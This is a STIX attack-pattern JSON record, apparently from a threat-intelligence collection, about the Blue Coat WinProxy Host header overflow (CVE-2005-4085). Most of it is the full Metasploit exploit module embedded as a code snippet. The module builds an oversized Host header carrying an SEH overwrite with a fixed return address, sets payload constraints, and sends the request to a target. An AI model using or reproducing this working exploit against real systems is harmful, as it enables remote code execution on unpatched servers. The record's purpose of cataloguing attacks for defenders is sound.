{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb2db678-a8be-495e-b3a6-6913f5ebf145",
    "created": "2024-08-14T16:56:42.717824Z",
    "modified": "2024-08-14T16:56:42.717829Z",
    "name": "Blue Coat WinProxy Host Header Overflow",
    "description": " This module exploits a buffer overflow in the Blue Coat Systems WinProxy service by sending a long port value for the Host header in a HTTP request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/proxy/bluecoat_winproxy_host.rb",
            "external_id": "bluecoat_winproxy_host.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-4085"
        },
        {
            "source_name": "reference",
            "url": "http://www.bluecoat.com/support/knowledge/advisory_host_header_stack_overflow.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :method => 'HEAD', :pattern => [ /BlueCoat/ ] }\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Blue Coat WinProxy Host Header Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Blue Coat Systems WinProxy\n        service by sending a long port value for the Host header in a HTTP\n        request.\n      },\n      'Author'         => 'MC',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-4085'],\n          ['OSVDB', '22238'],\n          ['BID', '16147'],\n          ['URL', 'http://www.bluecoat.com/support/knowledge/advisory_host_header_stack_overflow.html'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 600,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'WinProxy <= 6.1 R1a Universal', { 'Ret' => 0x6020ba04 } ], # Asmdat.dll\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2005-01-05',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit  = \"GET / HTTP/1.1\" + \"\\r\\n\"\n    sploit += \"Host: 127.0.0.1:\"\n    sploit += rand_text_english(31, payload_badchars)\n    seh  = generate_seh_payload(target.ret)\n    sploit[23, seh.length] = seh\n    sploit += \"\\r\\n\\r\\n\"\n\n    sock.put(sploit)\n    sock.get_once(-1, 3)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-01-05",
    "x_mitre_platforms": [
        "win'"
    ]
}